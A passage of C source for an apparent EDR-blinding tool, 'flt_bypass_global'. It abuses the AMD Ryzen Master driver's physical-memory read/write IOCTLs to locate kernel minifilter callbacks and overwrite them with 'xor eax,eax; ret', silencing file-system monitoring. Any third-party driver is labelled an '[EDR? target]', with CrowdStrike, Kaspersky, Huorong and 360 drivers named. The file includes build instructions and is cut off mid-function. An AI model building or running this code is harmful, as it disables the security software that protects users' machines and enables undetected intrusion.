/*
 * flt_bypass_global.c â€” Disable ALL minifilter Pre/Post callbacks
 *
 * Primary method: patch function code to "xor eax,eax; ret" (0x31 0xC0 0xC3)
 *   â†’ function is called normally by fltmgr, returns FLT_PREOP_SUCCESS_NO_CALLBACK (0)
 *   â†’ no NULL pointer in _CALLBACK_NODE.PreOperation
 *   â†’ no risk of BSOD from fltmgr not checking for NULL
 *
 * Fallback (belt+suspenders): also zero _CALLBACK_NODE.PreOperation pointer
 *   â†’ prevents the call entirely if fltmgr does check NULL
 *
 * How we find the function's physical address:
 *   1. Driver VA base and image size from NtQuerySystemInformation (module list)
 *   2. Compute RVA = func_va - drv_va_base
 *   3. Read driver .sys from disk: get TimeDateStamp from PE header
 *   4. Scan physical memory at 4KB boundaries for MZ + PE + matching TimeDateStamp
 *      â†’ find driver_pa_base
 *   5. func_pa = driver_pa_base + RVA
 *
 * Patch bytes: 0x31 0xC0 0xC3  =  xor eax, eax  +  ret
 *   Returns FLT_PREOP_SUCCESS_NO_CALLBACK (0) â€” fltmgr continues as if filter passed
 *
 * v4 false-positive guards (all retained) + 3 new guards for global scan:
 *   1. filter & 7 == 0            pool alloc = 8-byte aligned
 *   2. preop  & 3 == 0            function ptr = >=4-byte aligned
 *   3. (filter>>20) != 0xFFFFF8   filter not in 0xFFFFF8xx image space (v4)
 *   4. va_to_driver(filter)==NULL  filter not inside ANY driver image (new)
 *   5. postop in same driver OR null (new)
 *   6. preop != postop             two distinct function pointers (new)
 *
 * Build:
 *   x86_64-w64-mingw32-gcc -O2 -Wall -o flt_bypass_global.exe \
 *       flt_bypass_global.c -lkernel32 -ladvapi32
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* â”€â”€ Driver â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
#define DEVICE_NAME      L"\\\\.\\AMDRyzenMasterDriverV20"
#define IOCTL_PHYS_READ  0x81112F08u
#define IOCTL_PHYS_WRITE 0x81112F0Cu
static HANDLE g_dev = INVALID_HANDLE_VALUE;

/* â”€â”€ Physical ranges â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
#define MAX_RANGES 64
typedef struct { uint64_t base, size; } PhysRange;
static PhysRange g_ranges[MAX_RANGES];
static int       g_nranges = 0;

static void load_ranges(void)
{
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
            "HARDWARE\\RESOURCEMAP\\System Resources\\Physical Memory",
            0, KEY_READ, &hKey) != ERROR_SUCCESS) return;
    char vname[256]; DWORD vn, vd, type;
    uint8_t *buf = NULL; DWORD sz = 0;
    for (DWORD i = 0; ; i++) {
        vn = sizeof vname; vd = 0;
        if (RegEnumValueA(hKey,i,vname,&vn,NULL,&type,NULL,&vd) == ERROR_NO_MORE_ITEMS) break;
        if ((type!=3&&type!=8)||vd<20) continue;
        buf = (uint8_t*)malloc(vd);
        if (!buf) continue;
        if (RegQueryValueExA(hKey,vname,NULL,NULL,buf,&vd) == ERROR_SUCCESS){sz=vd;break;}
        free(buf); buf=NULL;
    }
    RegCloseKey(hKey);
    if (!buf||sz<20){free(buf);return;}
    DWORD cnt=*(DWORD*)(buf+16); uint8_t *p=buf+20;
    for (DWORD i=0;i<cnt&&g_nranges<MAX_RANGES;i++,p+=20){
        if(p+20>buf+sz||p[0]!=3) continue;
        g_ranges[g_nranges].base=*(uint64_t*)(p+4);
        g_ranges[g_nranges].size=*(uint64_t*)(p+12);
        g_nranges++;
    }
    free(buf);
}

static int pa_in_range(uint64_t pa, uint32_t sz)
{
    for(int i=0;i<g_nranges;i++)
        if(pa>=g_ranges[i].base&&pa+sz<=g_ranges[i].base+g_ranges[i].size) return 1;
    return 0;
}

/* â”€â”€ Physical I/O â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
static int phys_read(uint64_t pa, void *buf, uint32_t sz)
{
    uint8_t in_buf[12];
    *(uint64_t*)in_buf=pa; *(uint32_t*)(in_buf+8)=sz;
    uint32_t out_sz=12+sz;
    uint8_t *out=(uint8_t*)calloc(1,out_sz); if(!out) return 0;
    DWORD got=0;
    BOOL ok=DeviceIoControl(g_dev,IOCTL_PHYS_READ,in_buf,12,out,out_sz,&got,NULL);
    if(ok&&got>=12) memcpy(buf,out+12,sz);
    free(out); return ok&&got>=12;
}

static int phys_write(uint64_t pa, const void *data, uint32_t sz)
{
    if(!pa_in_range(pa,sz)) return 0;
    uint32_t in_sz=12+sz;
    uint8_t *in_buf=(uint8_t*)malloc(in_sz); if(!in_buf) return 0;
    *(uint64_t*)in_buf=pa; *(uint32_t*)(in_buf+8)=sz;
    memcpy(in_buf+12,data,sz);
    DWORD got=0;
    BOOL ok=DeviceIoControl(g_dev,IOCTL_PHYS_WRITE,in_buf,in_sz,NULL,0,&got,NULL);
    free(in_buf); return ok;
}

static __attribute__((unused))
int phys_write_v(uint64_t pa, const void *data, uint32_t sz)
{
    if(!phys_write(pa,data,sz)) return 0;
    uint8_t buf[8]={0}; uint32_t vsz=sz<8?sz:8;
    if(!phys_read(pa,buf,vsz)) return 0;
    return memcmp(buf,data,vsz)==0;
}

/* â”€â”€ Module list â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
typedef NTSTATUS (NTAPI *PFN_NTQSI)(ULONG,PVOID,ULONG,PULONG);
typedef struct {
    HANDLE Section; PVOID MappedBase,ImageBase;
    ULONG  ImageSize,Flags;
    USHORT LoadOrderIndex,InitOrderIndex,LoadCount,OffsetToFileName;
    CHAR   FullPathName[256];
} MOD_ENTRY;
typedef struct { ULONG NumberOfModules; MOD_ENTRY Modules[1]; } MOD_LIST;

static MOD_LIST *get_module_list(void)
{
    PFN_NTQSI fn=(PFN_NTQSI)GetProcAddress(GetModuleHandleA("ntdll.dll"),"NtQuerySystemInformation");
    if(!fn) return NULL;
    ULONG sz=0x80000; MOD_LIST *ml=NULL; NTSTATUS st;
    do{free(ml);ml=(MOD_LIST*)malloc(sz*=2);st=fn(11,ml,sz,NULL);}
    while(st==(NTSTATUS)0xC0000004L);
    if(st){free(ml);return NULL;} return ml;
}

/* â”€â”€ Kernel module map â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
#define MAX_MODS 256
typedef struct { uint64_t base,size; char name[64]; } KMod;
static KMod g_mods[MAX_MODS];
static int  g_nmods=0;

static void load_module_map(void)
{
    MOD_LIST *ml=get_module_list(); if(!ml) return;
    for(ULONG i=0;i<ml->NumberOfModules&&g_nmods<MAX_MODS;i++){
        g_mods[g_nmods].base=(uint64_t)ml->Modules[i].ImageBase;
        g_mods[g_nmods].size=ml->Modules[i].ImageSize;
        const char *fn=ml->Modules[i].FullPathName+ml->Modules[i].OffsetToFileName;
        strncpy(g_mods[g_nmods].name,fn,63); g_mods[g_nmods].name[63]='\0';
        g_nmods++;
    }
    free(ml);
}

/* Returns driver name if va is inside a loaded driver (not ntoskrnl index 0). */
static const char *va_to_driver(uint64_t va)
{
    for(int i=1;i<g_nmods;i++)
        if(va>=g_mods[i].base&&va<g_mods[i].base+g_mods[i].size)
            return g_mods[i].name;
    return NULL;
}

/* Returns driver name AND fills rva_out with the RVA within the driver. */
static const char *va_to_driver_ex(uint64_t va, uint64_t *rva_out)
{
    for(int i=1;i<g_nmods;i++)
        if(va>=g_mods[i].base&&va<g_mods[i].base+g_mods[i].size){
            if(rva_out) *rva_out=va-g_mods[i].base;
            return g_mods[i].name;
        }
    return NULL;
}

/*
 * Driver classification for display and safety warnings.
 *
 * DRV_SYSTEM  â€” critical OS/filesystem/storage drivers. NEVER zero these.
 * DRV_NETWORK â€” network stack drivers. Not EDR-related.
 * DRV_VM      â€” hypervisor / VM guest drivers. Not EDR-related.
 * DRV_OTHER   â€” unknown / potential EDR/AV driver. Safe to investigate.
 */
typedef enum { DRV_SYSTEM, DRV_NETWORK, DRV_VM, DRV_OTHER } DrvClass;

static DrvClass classify_driver(const char *name)
{
    /*
     * Classification is EXCLUSION-BASED: anything not here â†’ DRV_OTHER = [EDR?].
     * [EDR?] means "not a known Windows/VM component" â€” could be EDR, AV, or a
     * Windows driver we haven't listed yet. Always verify before zeroing.
     *
     * Third-party AV/EDR (Huorong HRAVFlt.sys, 360 HipsDrv.sys, Kaspersky klif.sys,
     * CrowdStrike csagent.sys, etc.) will NOT be in this list â†’ correctly [EDR?].
     */
    static const char *sys_list[] = {
        /* core filesystem + filter manager */
        "Ntfs.sys","FLTMGR.SYS","fileinfo.sys","Wof.sys","refs.sys",
        "FastFat.sys","exfat.sys","cdfs.sys","udfs.sys","rdbss.sys",
        "luafv.sys","npfs.sys","mup.sys","DfsC.sys","dfsc.sys",
        /* network filesystem redirectors */
        "mrxsmb.sys","mrxsmb10.sys","mrxsmb20.sys","rdpdr.sys","WebDAVSystem.sys",
        /* storage */
        "volmgrx.sys","volmgr.sys","disk.sys","storport.sys","classpnp.sys",
        "CLFS.SYS","fvevol.sys","iorate.sys","storqosflt.sys","EhStorClass.sys",
        /* Win32 kernel + security baseline (Microsoft only) */
        "win32kfull.sys","win32kbase.sys","ksecdd.sys","cng.sys",
        "WindowsTrustedRT.sys","WindowsTrustedRTProxy.sys",
        "CI.dll","ci.dll",
        /* Windows container/virtualization filesystem filters */
        "bindflt.sys",       /* Bind Filter â€” AppContainer/containerization (~400000) */
        "wcifs.sys",         /* Windows Container Isolation FS (~180451) */
        "PrjFlt.sys",        /* Projected Filesystem / VirtDisk (~189900) */
        "cloud_filter.sys",  /* Cloud Files filter â€” OneDrive/sync (~180460) */
        "cldflt.sys",        /* Cloud Files IFS mini-filter (~180451) */
        "FileCrypt.sys",     /* EFS / file encryption filter (~141100) */
        "WinSetupMon.sys",   /* Windows Setup Monitor */
        "FsDepends.sys",     /* Filesystem dependency mini-rdr */
        "peauth.sys",        /* Protected Environment Auth driver */
        /* Windows diagnostics / telemetry */
        "sysdiag.sys",       /* System Diagnostics mini-filter */
        "bfs.sys",           /* Background Fetch Service â€” Windows Update/DO */
        "Ndu.sys",           /* Network Data Usage monitoring */
        "SleepStudyHelper.sys",
        /* AppLocker / WDAC / security policy â€” Microsoft policy enforcement */
        "applockerfltr.sys", /* AppLocker file system filter (~350000) */
        "wdcsam64_prewin8.sys","wdcsam.sys",
        /* misc system */
        "werkernel.sys","pcw.sys","DxgKrnl.sys","dxgmms2.sys",
        "condrv.sys","CompositeBus.sys","acpiex.sys",
        NULL
    };
    static const char *net_list[] = {
        "tcpip.sys","HTTP.sys","msquic.sys","tdx.sys","afd.sys",
        "netbt.sys","tdo.sys","mslldp.sys","pacer.sys","ndis.sys",
        "netio.sys","rpcxdr.sys","nsiproxy.sys","mslldp.sys",
        "wfplwfs.sys",       /* WFP Lightweight Filter Service (~9000) */
        "ndisimplatform.sys","ndistapi.sys","ndiswan.sys",
        "tunnel.sys","PPTP.sys","rassstp.sys","wanarp.sys","wanarpv6.sys",
        "rdbss.sys","bowser.sys","srv2.sys","srvnet.sys",
        NULL
    };
    static const char *vm_list[] = {
        "vmhgfs.sys","vmmemctl.sys","vmxnet3nd.sys","vmci.sys",
        "vmbus.sys","hvsocket.sys","hyperkbd.sys","hvnetvsc.sys",
        "VBoxGuest.sys","VBoxMouse.sys","VBoxSF.sys",
        "xenfilt.sys","xenbus.sys","xenvbd.sys","xenvif.sys",
        NULL
    };
    for(int i=0;sys_list[i];i++) if(_stricmp(name,sys_list[i])==0) return DRV_SYSTEM;
    for(int i=0;net_list[i];i++) if(_stricmp(name,net_list[i])==0) return DRV_NETWORK;
    for(int i=0;vm_list[i];i++) if(_stricmp(name,vm_list[i])==0) return DRV_VM;
    return DRV_OTHER;
}

static const char *drv_class_label(DrvClass c)
{
    switch(c){
        case DRV_SYSTEM:  return "[SYS  !!DO-NOT-ZERO!!]";
        case DRV_NETWORK: return "[NET  skip]";
        case DRV_VM:      return "[VM   skip]";
        default:          return "[EDR? target]";
    }
}

/* get_driver_company defined after find_driver_path below */
static const char *get_driver_company(const char *drv_name);

/* Max reasonable RVA for a minifilter callback function in a driver image.
 * Real callbacks are in .text â€” drivers > 4MB code sections don't exist.
 * Large/negative RVAs (e.g. vmhgfs+0x8F6D730 = 150MB) are false positives
 * where preop happens to fall in a driver's mmap'd data region, not code. */
#define MAX_SANE_RVA 0x400000ULL  /* 4 MB */

/* â”€â”€ Cache eviction â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
#define EVICT_SIZE (256*1024*1024)
static void cache_evict_once(void)
{
    volatile uint8_t *p=(volatile uint8_t*)
        VirtualAlloc(NULL,EVICT_SIZE,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
    if(!p){Sleep(100);return;}
    for(size_t i=0;i<EVICT_SIZE;i+=64) p[i]=(uint8_t)(i>>6);
    volatile uint64_t s=0;
    for(size_t i=EVICT_SIZE;i>=64;i-=64) s^=p[i-64];
    (void)s;
    VirtualFree((LPVOID)p,0,MEM_RELEASE); Sleep(10);
}
static void cache_evict_multiccd(void)
{
    SYSTEM_INFO si; GetSystemInfo(&si); DWORD ncpu=si.dwNumberOfProcessors;
    HANDLE thr=GetCurrentThread();
    DWORD_PTR orig=SetThreadAffinityMask(thr,1);
    SetThreadAffinityMask(thr,1ULL); Sleep(1); cache_evict_once();
    if(ncpu>1){SetThreadAffinityMask(thr,(DWORD_PTR)1<<(ncpu-1));Sleep(1);cache_evict_once();}
    SetThreadAffinityMask(thr,orig);
}

/* â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 * PE helpers  (rva_to_fo + pattern scan defined after CHUNK_SIZE/g_chunk)
 * â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• */

/* â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 * Driver physical base finder
 *
 * Reads TimeDateStamp from the driver .sys file, then scans physical
 * memory at 4KB boundaries looking for:
 *   - MZ signature at offset 0
 *   - PE\0\0 at pe_off
 *   - Machine == 0x8664 (AMD64)
 *   - TimeDateStamp matching the disk file
 *
 * Returns the physical address of the driver's MZ header, or 0.
 * â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• */
#define CHUNK_SIZE 0x10000
static uint8_t g_chunk[CHUNK_SIZE];

static __attribute__((noinline))
int find_driver_path(const char *drv_name, char *path_out, int max)
{
    char windir[512], sysdir[512];
    GetWindowsDirectoryA(windir, sizeof windir);
    GetSystemDirectoryA(sysdir, sizeof sysdir);

    snprintf(path_out, max, "%s\\drivers\\%s", sysdir, drv_name);
    if(GetFileAttributesA(path_out)!=INVALID_FILE_ATTRIBUTES) return 1;

    snprintf(path_out, max, "%s\\%s", sysdir, drv_name);
    if(GetFileAttributesA(path_out)!=INVALID_FILE_ATTRIBUTES) return 1;

    snprintf(path_out, max, "%s\\SysWOW64\\drivers\\%s", windir, drv_name);
    if(GetFileAttributesA(path_out)!=INVALID_FILE_ATTRIBUTES) return 1;

    return 0;
}

static uint64_t find_driver_pa(const char *drv_name)
{
    char path[1024];
    if(!find_driver_path(drv_name, path, sizeof path)){
        printf("      [!] Cannot find %s on disk\n", drv_name);
        return 0;
    }

    /* Read first 0x200 bytes to get PE header fields */
    HANDLE hf=CreateFileA(path,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
    if(hf==INVALID_HANDLE_VALUE) return 0;
    uint8_t hdr[0x200]={0}; DWORD rd=0;
    ReadFile(hf,hdr,sizeof hdr,&rd,NULL); CloseHandle(hf);

    if(rd<0x50||hdr[0]!='M'||hdr[1]!='Z') return 0;
    uint32_t pe_off=*(uint32_t*)(hdr+0x3C);
    if(pe_off+12>rd) return 0;
    if(*(uint32_t*)(hdr+pe_off)!=0x00004550) return 0; /* PE\0\0 */

    uint16_t machine =*(uint16_t*)(hdr+pe_off+4);  /* 0x8664 = AMD64 */
    uint32_t ts      =*(uint32_t*)(hdr+pe_off+8);  /* TimeDateStamp (unique per build) */
    uint16_t opt_magic=*(uint16_t*)(hdr+pe_off+24); /* 0x20B = PE32+ */

    printf("      Disk: machine=0x%04X  ts=0x%08X  opt_magic=0x%04X\n",
           machine, ts, opt_magic);

    /* Scan physical memory at 4KB boundaries for matching MZ */
    uint64_t last_prog=0;
    for(int ri=0;ri<g_nranges;ri++){
        uint64_t rend=g_ranges[ri].base+g_ranges[ri].size;
        for(uint64_t cpa=g_ranges[ri].base;cpa<rend;cpa+=CHUNK_SIZE){
            if(cpa-last_prog>=0x80000000ULL){
                printf("      [%5llu MB]\r",(unsigned long long)(cpa>>20));
                fflush(stdout); last_prog=cpa;
            }
            uint64_t csz=rend-cpa; if(csz>CHUNK_SIZE) csz=CHUNK_SIZE;
            if(!phys_read(cpa,g_chunk,(uint32_t)csz)) continue;

            /* Check every 4KB page within this chunk */
            for(uint64_t off=0;off+0x50<=csz;off+=0x1000){
                if(g_chunk[off]!='M'||g_chunk[off+1]!='Z') continue;
                uint32_t peo=*(uint32_t*)(g_chunk+off+0x3C);
                if(peo+28>csz-off) continue;
                if(*(uint32_t*)(g_chunk+off+peo)!=0x00004550) continue;
                if(*(uint16_t*)(g_chunk+off+peo+4)!=machine) continue;
                if(*(uint32_t*)(g_chunk+off+peo+8)!=ts) continue;
                printf("      Found at PA=0x%016llX\n",(unsigned long long)(cpa+off));
                return cpa+off;
            }
        }
    }
    return 0;
}

/*
 * get_driver_company â€” read CompanyName from driver VersionInfo on disk.
 * Returns static buffer with company name, or NULL if not found.
 */
static const char *get_driver_company(const char *drv_name)
{
    static char s_company[128];
    char path[1024];
    if(!find_driver_path(drv_name, path, sizeof path)) return NULL;

    DWORD dummy;
    DWORD sz = GetFileVersionInfoSizeA(path, &dummy);
    if(!sz) return NULL;
    void *buf = malloc(sz);
    if(!buf) return NULL;
    if(!GetFileVersionInfoA(path, 0, sz, buf)){free(buf);return NULL;}

    static const char *queries[] = {
        "\\StringFileInfo\\040904B0\\CompanyName",
        "\\StringFileInfo\\040904E4\\CompanyName",
        "\\StringFileInfo\\000004B0\\CompanyName",
        NULL
    };
    const char *found = NULL;
    for(int i=0;queries[i]&&!found;i++){
        UINT len=0; char *val=NULL;
        if(VerQueryValueA(buf,(char*)queries[i],(void**)&val,&len)&&len>0){
            strncpy(s_company,val,127); s_company[127]='\0';
            found=s_company;
        }
    }
    free(buf);
    return found;
}

/* â”€â”€ RVA â†’ file offset (PE section table) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
static uint32_t rva_to_fo(const uint8_t *pe, uint32_t fsz, uint32_t rva)
{
    if(fsz<0x40||pe[0]!='M'||pe[1]!='Z') return 0;
    uint32_t pe_off=*(uint32_t*)(pe+0x3C);
    if(pe_off+24>fsz) return 0;
    uint16_t n_sec=*(uint16_t*)(pe+pe_off+6);
    uint16_t opt_sz=*(uint16_t*)(pe+pe_off+20);
    uint32_t stab=pe_off+24+opt_sz;
    for(int i=0;i<n_sec;i++){
        uint32_t s=stab+i*40; if(s+40>fsz) break;
        uint32_t va=*(uint32_t*)(pe+s+12);
        uint32_t vs=*(uint32_t*)(pe+s+16);
        uint32_t ro=*(uint32_t*)(pe+s+20);
        if(rva>=va&&rva<va+vs) return ro+(rva-va);
    }
    return 0;
}

/*
 * find_driver_pa_by_func â€” find driver PA via function prologue pattern.
 *
 * Windows zeroes/unmaps PE headers after loading (security hardening).
 * MZ scan fails; code pages are intact. We read the function prologue
 * from disk and scan physical memory for an exact 16-byte match.
 */
static uint64_t find_driver_pa_by_func(const char *drv_name,
                                        uint64_t func_va, uint64_t drv_va)
{
    uint32_t rva=(uint32_t)(func_va-drv_va);
    char path[1024];
    if(!find_driver_path(drv_name,path,sizeof path)) return 0;

    HANDLE hf=CreateFileA(path,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
    if(hf==INVALID_HANDLE_VALUE) return 0;
    DWORD fsz=GetFileSize(hf,NULL);
    uint8_t *pe=(uint8_t*)malloc(fsz); DWORD rd=0;
    ReadFile(hf,pe,fsz,&rd,NULL); CloseHandle(hf);

    uint32_t fo=rva_to_fo(pe,fsz,rva);
    uint8_t pat[16]={0};
    if(fo&&fo+16<=fsz) memcpy(pat,pe+fo,16);
    free(pe);

    if(pat[0]==0x00||pat[0]==0xCC||pat[0]==0x90) return 0;

    uint64_t found_pa=0; int n_found=0; uint64_t last_prog=0;
    for(int ri=0;ri<g_nranges;ri++){
        uint64_t rend=g_ranges[ri].base+g_ranges[ri].size;
        for(uint64_t cpa=g_ranges[ri].base;cpa<rend;cpa+=CHUNK_SIZE){
            if(cpa-last_prog>=0x80000000ULL){
                printf("      [%5llu MB]\r",(unsigned long long)(cpa>>20));
                fflush(stdout); last_prog=cpa;
            }
            uint64_t csz=rend-cpa; if(csz>CHUNK_SIZE) csz=CHUNK_SIZE;
            if(!phys_read(cpa,g_chunk,(uint32_t)csz)) continue;
            for(uint64_t off=0;off+16<=csz;off++){
                if(memcmp(g_chunk+off,pat,16)!=0) continue;
                uint64_t base_cand=cpa+off-rva;
                if(pa_in_range(base_cand,0x1000)){
                    if(!n_found) found_pa=cpa+off;
                    n_found++;
                }
            }
        }
    }
    printf("      \n");
    if(n_found==1){
        printf("      Match: func_pa=0x%016llX  drv_base=0x%016llX\n",
               (unsigned long long)found_pa,(unsigned long long)(found_pa-rva));
        return found_pa-rva;
    }
    if(n_found>1) printf("      %d matches (ambiguous) â€” trying next func\n",n_found);
    return 0;
}

/* â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 * Function patcher
 *
 * Patches the first PATCH_LEN bytes of a kernel function to:
 *   xor eax, eax   (31 C0)  â€” zero return value = FLT_PREOP_SUCCESS_NO_CALLBACK
 *   ret            (C3)     â€” return immediately
 *
 * Stores the original bytes for restore.
 * â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• */
#define PATCH_LEN 3
static const uint8_t PATCH_BYTES[PATCH_LEN] = {0x31, 0xC0, 0xC3};

typedef struct {
    uint64_t func_va;
    uint64_t func_pa;
    uint8_t  orig[PATCH_LEN];
    char     drv_name[64];
} PatchedFunc;

#define MAX_PFUNCS 256
static PatchedFunc g_pfuncs[MAX_PFUNCS];
static int         g_n_pfuncs = 0;

/*
 * patch_func â€” read orig bytes, write PATCH_BYTES, record for restore.
 * drv_pa: physical base of the driver (from find_driver_pa).
 * drv_va: kernel VA base of the driver (from module list).
 */
static int patch_func(uint64_t func_va, uint64_t drv_pa, uint64_t drv_va,
                      const char *drv_name)
{
    if(!drv_pa) return 0;
    if(g_n_pfuncs>=MAX_PFUNCS) return 0;

    /* Check we haven't already patched this function */
    for(int i=0;i<g_n_pfuncs;i++)
        if(g_pfuncs[i].func_va==func_va) return 1; /* already done */

    uint32_t rva=(uint32_t)(func_va-drv_va);
    uint64_t func_pa=drv_pa+rva;

    if(!pa_in_range(func_pa,PATCH_LEN)){
        printf("      [!] func_pa=0x%016llX not in physical ranges\n",
               (unsigned long long)func_pa);
        return 0;
    }

    PatchedFunc *pf=&g_pfuncs[g_n_pfuncs];
    if(!phys_read(func_pa,pf->orig,PATCH_LEN)){
        printf("      [!] phys_read failed at func_pa=0x%016llX\n",
               (unsigned long long)func_pa);
        return 0;
    }

    /* Sanity: first byte of a function should look like valid x64 code.
     * If it's already 0xC3 or 0x31 we may be hitting wrong location. */
    if(pf->orig[0]==0xC3){
        printf("      [?] func at RVA 0x%X already starts with RET â€” skipping\n", rva);
        return 0;
    }

    if(!phys_write(func_pa,PATCH_BYTES,PATCH_LEN)){
        printf("      [!] phys_write failed at func_pa=0x%016llX\n",
               (unsigned long long)func_pa);
        return 0;
    }

    pf->func_va=func_va;
    pf->func_pa=func_pa;
    strncpy(pf->drv_name,drv_name,63); pf->drv_name[63]='\0';
    g_n_pfuncs++;
    return 1;
}

static void restore_all_funcs(void)
{
    for(int i=0;i<g_n_pfuncs;i++){
        PatchedFunc *pf=&g_pfuncs[i];
        /* Only restore if our patch is still there */
        uint8_t cur[PATCH_LEN]={0};
        if(phys_read(pf->func_pa,cur,PATCH_LEN)&&
           memcmp(cur,PATCH_BYTES,PATCH_LEN)==0)
            phys_write(pf->func_pa,pf->orig,PATCH_LEN);
    }
}

/* â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 * Scan structures
 * â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• */
typedef struct {
    uint64_t preop_pa, postop_pa;
    uint64_t preop, postop, filter;
    uint8_t  anchor;
    uint8_t  raw64[64];
    uint8_t  _pad[7];
} FltNode;

#define MAX_RAW         16384
#define MAX_NODES_GROUP    96
#define MAX_GROUPS         64
#define MIN_VOTES           5

typedef struct {
    uint64_t filter_va;
    char     driver[64];
    int      n;
    int      zeroed;
    FltNode  nodes[MAX_NODES_GROUP];
} FilterGroup;

static FltNode    *g_raw=NULL;
static int         g_n_raw=0;
static FilterGroup g_groups[MAX_GROUPS];
static int         g_n_groups=0;
static volatile int g_any_zeroed=0;

/* â”€â”€ Stage 1 (6-guard candidate scan) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
static int try_anchor(uint64_t cpa, uint64_t off, uint8_t anc, uint64_t csz)
{
    if(off<(uint64_t)anc||off+0x10>csz) return 0;

    uint64_t preop =*(uint64_t*)(g_chunk+off);
    uint64_t preop_rva=0;
    const char *pre_drv=va_to_driver_ex(preop,&preop_rva);
    if(!pre_drv) return 0;

    /* Guard 7 (new): RVA sanity check.
     * Callback functions live in .text â€” no real callback has an RVA > 4MB.
     * vmhgfs.sys+0x8F6D730 (150MB) / negative-wrap RVAs are false positives
     * from drivers that mmap large regions (RVA wraps in uint64 arithmetic). */
    if(preop_rva==0||preop_rva>=MAX_SANE_RVA) return 0;

    uint64_t flink =*(uint64_t*)(g_chunk+off-anc+0x00);
    uint64_t blink =*(uint64_t*)(g_chunk+off-anc+0x08);
    uint64_t filter=*(uint64_t*)(g_chunk+off-anc+0x10);
    uint64_t postop=*(uint64_t*)(g_chunk+off+0x08);

    if(flink <0xFFFF800000000000ULL) return 0;
    if(blink <0xFFFF800000000000ULL) return 0;
    if(filter<0xFFFF800000000000ULL) return 0;
    if(postop&&postop<0xFFFF800000000000ULL) return 0;
